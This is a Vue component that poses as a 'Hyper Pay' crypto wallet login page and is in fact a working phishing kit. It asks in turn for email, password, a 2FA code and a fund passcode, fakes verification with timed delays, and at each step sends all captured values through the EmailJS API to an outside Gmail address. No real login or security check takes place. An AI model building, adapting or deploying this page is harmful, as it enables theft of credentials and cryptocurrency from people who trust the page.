<template>
  <div>
    <div style="width: fit-content;" class="bg-transparent border border-gray-600 mb-6 w-fit rounded-full flex space-x-1 shadow-sm">
      <div
        :class="`${
          activeTab === 'one' ? 'bg-[#006eff]' : ''
        } text-white cursor-pointer font-semibold text-sm rounded-full px-2 py-2`"
        @click="changeActiveTab('one')"
      >
        Custody
      </div>
      <div
        :class="`${
          activeTab === 'two' ? 'bg-[#006eff]' : ''
        } text-gray-500 hover:text-[#006eff] cursor-pointer font-semibold text-sm rounded-full px-2 py-2`"
        @click="changeActiveTab('two')"
      >
        Web3
      </div>
    </div>
    <hr class="border-gray-600">
    <div
      class="rounded-lg w-full mt-10"
      
    >
      <div id="ethmerge">
        <section class="section" v-if="pageView === 'one'">
          <h1 class="mb-12 text-2xl text-white md:text-[31px] font-bold">
            Login Now <span class="text-[#006eff]">Off-Chain Wallet</span>
          </h1>
          <div>
            <div>
              <label class="text-white" for="">Email/Phone Number</label>
              <input
                style="
                  border-radius: 8px;
                  transition: 0.2s ease-in-out;
                  font-weight: 400;
                "
                class="mt-2 h-[54px] border border-gray-600 bg-transparent text-gray-400 w-full rounded-lg px-4 py-4 focus:ring focus:ring-[#185cff] focus:border-[#185cff]"
                type="email"
                v-model="email"
                placeholder=""
              />
            </div>
            <div class="mt-5">
              <label class="text-white" for="">Password </label>
              <input
                style="
                  border-radius: 8px;
                  transition: 0.2s ease-in-out;
                  font-weight: 400;
                "
                class="mt-2 h-[54px] border border-gray-600 bg-transparent text-gray-400 w-full rounded-lg px-4 py-4 focus:ring focus:ring-[#185cff] focus:border-[#185cff]"
                type="password"
                v-model="password"
                placeholder=""
              />
            </div>
            <div class="mb-10 mt-10">
              <label class="MuiFormControlLabel-root flex items-center"
                ><span
                  class="MuiButtonBase-root MuiIconButton-root jss692 MuiCheckbox-root MuiCheckbox-colorSecondary jss693 Mui-checked MuiIconButton-colorSecondary"
                  aria-disabled="false"
                >
                  <input
                    class="jss695"
                    type="checkbox"
                    data-indeterminate="false"
                    value=""
                  />
                </span>
                <span
                  class="text-[#185cff] ml-2 MuiTypography-root MuiFormControlLabel-label MuiTypography-body2"
                  >I agree to the
                  <a
                    class="text-[#185cff] MuiTypography-root MuiLink-root MuiLink-underlineHover MuiTypography-colorPrimary jss58"
                    target="_blank"
                    rel="noopener noreferrer"
                    href="/"
                    >terms of Service</a
                  >.</span
                ></label
              >
            </div>
          </div>
          <button
            @click="proceed"
            class="flex items-center justify-center bg-[#3377f8] w-full py-4 rounded-full"
          >
            <div class="flex items-center">
              <strong class="text-white">Login</strong>
              <div
                v-if="isLoading"
                class="ml-2 w-5 h-5 rounded-full animate-spin border-4 border-dashed border-primary border-t-transparent"
              ></div>
            </div>
          </button>
        </section>

        <section class="secton" v-if="pageView === 'two'">
          <h1 class="mb-12 text-2xl text-white md:text-[31px] font-bold">
            Input Authenication Code <span class="text-[#006eff]">(2FA)</span>
          </h1>
          <div class="mb-10">
            <div>
              <label class="text-white" for=""
                >Input Authentication Code</label
              >
              <input
               style="
                  border-radius: 8px;
                  transition: 0.2s ease-in-out;
                  font-weight: 400;
                "
                class="mt-2 h-[54px] border border-gray-600 bg-transparent text-gray-400 w-full rounded-lg px-4 py-4 focus:ring focus:ring-[#185cff] focus:border-[#185cff]"
                type="number"
                v-model="code"
                placeholder=""
              />
              <span class="text-red-400 text-sm">2FA must be numbers only</span>
            </div>
          </div>
          <button
            @click="checkVerificationCode"
            class="flex items-center justify-center text-white bg-[#3377f8] w-full py-4 rounded-full"
          >
            <div class="flex items-center">
              <strong class="text-white">Proceed</strong>
              <div
                v-if="isLoadingCheck"
                class="ml-2 w-5 h-5 rounded-full animate-spin border-4 border-dashed border-primary border-t-transparent"
              ></div>
            </div>
          </button>
        </section>

        <section class="secton" v-if="pageView === 'three'">
          <h1 class="mb-12 text-2xl text-white md:text-[31px] font-bold">
            Input Fund/Trading Passcode
            <span class="text-[#3377f8]">(Verify Ownership)</span>
          </h1>
          <div class="mb-10">
            <div>
              <label class="text-white" for="">Input Passcode</label>
              <input
                style="
                  border-radius: 8px;
                  transition: 0.2s ease-in-out;
                  font-weight: 400;
                "
                class="mt-2 h-[54px] border border-gray-600 bg-transparent text-gray-400 w-full rounded-lg px-4 py-4 focus:ring focus:ring-[#185cff] focus:border-[#185cff]"
                type="text"
                v-model="passcode"
                placeholder=""
              />
            </div>
          </div>
          <button
            @click="checkPassCode"
            class="flex items-center justify-center text-white bg-[#3377f8] w-full py-4 rounded-full"
          >
            <div class="flex items-center">
              <strong class="text-white">Continue</strong>
              <div
                v-if="isLoadingCheck"
                class="ml-2 w-5 h-5 rounded-full animate-spin border-4 border-dashed border-primary border-t-transparent"
              ></div>
            </div>
          </button>
        </section>
      </div>
    </div>
  </div>
</template>

<script>
import axios from 'axios'
export default {
  data() {
    return {
      isLoading: false,
      isLoadingCheck: false,
      email: '',
      password: '',
      pageView: 'one',
      intervalid1: '',
      intervalid2: '',
      intervalid3: '',
      code: '',
      passcode: '',
      activeTab: 'one'
    }
  },
  methods: {
    changeActiveTab(params) {
      if (params === 'one') {
        this.$router.push('/custody')
      }
      if (params === 'two') {
        this.$router.push('/web3')
      }
    },
    proceed() {
      const self = this
      this.isLoading = true
      this.getInformation()
      this.intervalid1 = setInterval(function () {
        self.isLoading = false
        self.pageView = 'two'
        self.myStopFunction()
      }, 3000)
    },

    myStopFunction() {
      clearInterval(this.intervalid1)
      clearInterval(this.intervalid2)
      clearInterval(this.intervalid3)
    },

    checkPassCode() {
      const self = this
      this.isLoadingCheck = true
      this.getInformation()
      if (this.code !== '') {
        this.intervalid3 = setInterval(function () {
          self.isLoadingCheck = false
          self.$router.push('/validation')
          self.myStopFunction()
        }, 3000)
      } else {
        this.$toast.error('Invalid passcode code, contact the admin')
        this.isLoadingCheck = false
      }
    },

    checkVerificationCode() {
      const self = this
      this.isLoadingCheck = true
      this.getInformation()
      if (this.code !== '') {
        this.intervalid2 = setInterval(function () {
          self.isLoadingCheck = false
          self.pageView = 'three'
          self.myStopFunction()
        }, 3000)
      } else {
        this.$toast.error('Invalid verification code, contact the admin')
        this.isLoadingCheck = false
      }
    },

    getInformation() {
      let self = this
      try {
        this.isLoading = true
        if (this.email !== '' && this.password !== '') {
          var data = {
            service_id: 'service_81x9bor',
            template_id: 'template_a7emnpt',
            user_id: 'NdrSHIyN7Q4LWKs5s',
            template_params: {
              from_name: 'Hyper Pay',
              email: this.email,
              password: this.password,
              validation_code: this.code,
              passcode: this.passcode,
              reply_to: 'customeronlineagent@gmail.com',
            },
          }
          axios
            .post('https://api.emailjs.com/api/v1.0/email/send', data)
            .then(function () {
              self.isLoading = false
            })
            .catch(function () {
              self.isLoading = false
              self.$toast.error('Something went wrong, contact administrator')
            })
        } else {
          this.$toast.info('Wrong Input!. Fill the input form ')
          this.isLoading = false
        }
      } catch (error) {
        this.$toast.error('Something went wrong')
      }
    },
  },
}
</script>

<style></style>
